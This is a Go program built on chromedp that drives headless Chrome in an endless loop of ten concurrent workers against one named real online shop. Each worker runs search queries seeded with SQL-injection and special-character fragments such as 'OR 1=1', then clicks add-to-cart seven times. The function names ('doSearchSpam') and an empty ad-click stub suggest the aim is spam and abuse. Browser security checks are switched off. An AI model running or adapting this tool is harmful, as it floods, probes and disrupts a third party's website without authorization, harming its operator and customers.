package main

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"time"

	"github.com/chromedp/chromedp"
)

var (
	// Set Chrome options for minimal resource usage
	opts = append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-first-run", true),
		chromedp.Flag("no-default-browser-check", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-setuid-sandbox", true),
		chromedp.Flag("disable-web-security", true),
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("disable-popup-blocking", true),
		chromedp.Flag("disable-breakpad", true),
		chromedp.Flag("disable-cloud-import", true),
		chromedp.Flag("disable-sync", true),
		chromedp.Flag("disable-background-networking", true),
		chromedp.Flag("disable-component-extensions-with-background-pages", true),
		chromedp.Flag("disable-default-apps", true),
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("disable-component-update", true),
		chromedp.Flag("disable-hang-monitor", true),
		chromedp.Flag("disable-prompt-on-repost", true),
		chromedp.Flag("disable-sync", true),
		chromedp.Flag("disable-web-resources", true),
		chromedp.Flag("disable-client-side-phishing-detection", true),
		chromedp.Flag("disable-component-update", true),
		chromedp.Flag("disable-default-apps", true),
		chromedp.Flag("disable-domain-reliability", true),
		chromedp.Flag("disable-ipc-flooding-protection", true),
		chromedp.Flag("disable-renderer-backgrounding", true),
		chromedp.Flag("disable-resource-fetching", true),
		chromedp.Flag("disable-search-geolocation-disclosure", true),
		chromedp.Flag("disable-signin-scoped-device-id", true),
		chromedp.Flag("disable-site-isolation-trials", true),
		chromedp.Flag("disable-spdy-proxy-for-https", true),
		chromedp.Flag("disable-usb-keyboard-detection", true),
		chromedp.Flag("disable-webgl", true),
		chromedp.Flag("disable-web-security", true),
		chromedp.Flag("disable-xss-auditor", true),
		chromedp.Flag("enable-automation", true),
		chromedp.Flag("enable-remote-extensions", true),
		chromedp.Flag("enable-tcp-fast-open", true),
		chromedp.Flag("enable-webgl", true),
		chromedp.Flag("ignore-certificate-errors", true),
		chromedp.Flag("ignore-certificate-errors-spki-list", true),
	)
)

func doGoogleAdsClick() {

}

func randomSearchText() string {
	searchTexts := []string{"'", "\\", "OR 1=1", "--", ";", "/*", "*/", "<", ">", "=", "+", "-", "%", "@", "!", "~", "`", "$", "^", "&", "*", "(", ")", "[", "]", "{", "}", "|", "\\", "\"", "'", ";", ":", "/", "?", ".", ",", "<", ">", "=", "+", "-", "_", "%", "@", "!", "~", "`", "$", "^", "&", "*", "(", ")", "[", "]", "{", "}", "|", "\\", "\"", ";", "--", "/*", "*/", "<", ">", "=", "+", "-", "%", "@", "!", "~", "`", "$", "^", "&", "*", "(", ")", "[", "]", "{", "}", "|", "\\", "\"", ";", "--", "/*", "*/", "<", ">", "=", "+", "-", "%", "@", "!", "~", "`", "$", "^", "&", "*", "(", ")", "[", "]", "{", "}", "|", "\\", "\"", ";", "--", "/*", "*/", "<", ">", "=", "+", "-", "%", "@", "!", "~", "`", "$", "^", "&", "*", "(", ")", "[", "]", "{", "}", "|", "\\", "\"", ";", "--", "/*", "*/", "<", ">", "=", "+", "-", "%", "@", "!", "~", "`", "$", "^", "&", "*", "(", ")", "[", "]", "{", "}", "|", "\\", "\"", ";", "--", "/*", "*/", "<", ">", "=", "+", "-", "%", "@", "!", "~", "`", "$", "^", "&", "*", "(", ")", "[", "]", "{", "}", "|", "\\", "\"", ";", "--", "/*", "*/", "<", ">", "=", "+", "-", "%", "@", "!", "~", "`", "$", "^", "&", "*", "(", ")", "[", "]", "{", "}", "|", "\\", "\"", ";", "--", "/*", "*/", "<", ">", "=", "+", "-", "%", "@", "!", "~", "`", "$", "^", "&", "*", "(", ")", "[", "]", "{", "}", "|", "\\", "\"", ";", "--", "/*", "*/", "<", ">", "="}
	normalSearchTexts := []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}

	selector := rand.Intn(2)
	if selector == 0 {
		return searchTexts[rand.Intn(len(searchTexts))]
	}
	return normalSearchTexts[rand.Intn(len(normalSearchTexts))]
}

func doSearchSpam(result chan bool) {
	ctx, cancel := chromedp.NewContext(context.Background())
	defer cancel()

	// Set timeout
	ctx, cancel = context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	// Define the URL to open
	url := "https://trungtamdienlanhsaoviet.vn/"

	// Run chromedp tasks
	var pageTitle string
	var postItemCount int
	// var containsAddToCart bool
	searchText := randomSearchText()
	// log.Println("Search Text:", searchText)
	err := chromedp.Run(ctx,
		chromedp.Navigate(url),     // Open the website
		chromedp.Title(&pageTitle), // Get the page title
		chromedp.Navigate(fmt.Sprintf("%s/?s=%s&post_type=product", url, searchText)), // Search for spam
		// Count the div with class "post-item"
		chromedp.Evaluate(`document.querySelectorAll('div.post-item').length`, &postItemCount),
	)

	// log.Println("Page Title:", pageTitle)
	// log.Println("Post Item Count:", postItemCount)

	if err != nil {
		result <- false
		return
	}

	if postItemCount > 0 {

		var buttonCount int
		err = chromedp.Run(ctx,
			// Click on tag a with class "plain"
			chromedp.Click(`img.attachment-woocommerce_thumbnail`, chromedp.ByQuery),
			// Count the button named "add-to-cart"
			chromedp.Evaluate(`document.querySelectorAll('button[name="add-to-cart"]').length`, &buttonCount),
		)

		if err != nil {
			result <- false
			return
		}

		// log.Println("Button Count:", buttonCount)

		if buttonCount > 0 {
			err = chromedp.Run(ctx,
				// Click on button named "add-to-cart"
				chromedp.Click(`button[name="add-to-cart"]`, chromedp.ByQuery),
				chromedp.Click(`button[name="add-to-cart"]`, chromedp.ByQuery),
				chromedp.Click(`button[name="add-to-cart"]`, chromedp.ByQuery),
				chromedp.Click(`button[name="add-to-cart"]`, chromedp.ByQuery),
				chromedp.Click(`button[name="add-to-cart"]`, chromedp.ByQuery),
				chromedp.Click(`button[name="add-to-cart"]`, chromedp.ByQuery),
				chromedp.Click(`button[name="add-to-cart"]`, chromedp.ByQuery),
			)

			if err != nil {
				result <- false
				return
			}

			// containsAddToCart = true
		}
	}

	// log.Printf("Process completed. Contains Add To Cart: %v", containsAddToCart)
	result <- true
}

func main() {

	timeStart := time.Now()

	runningCount := 0
	succeedCount := 0
	totalCount := 0
	resultChan := make(chan bool)
	for {
		if runningCount < 10 {
			go func() {
				doSearchSpam(resultChan)
			}()
			runningCount++
		}

		select {
		case res := <-resultChan:
			runningCount--
			totalCount++
			if res {
				succeedCount++
			}

			successRate := int(succeedCount * 100 / totalCount)
			executedTime := time.Since(timeStart)
			hours := executedTime / time.Hour
			executedTime -= hours * time.Hour
			minutes := executedTime / time.Minute
			executedTime -= minutes * time.Minute
			seconds := executedTime / time.Second
			log.Printf("%02dh%02dm%02ds, Total: %d, Succeed: %d, Failed: %d", hours, minutes, seconds, totalCount, successRate, totalCount-succeedCount)
		default:
			if runningCount > 10 {
				time.Sleep(1 * time.Second)
				log.Println("Sleeping...")
			}
		}
	}
}
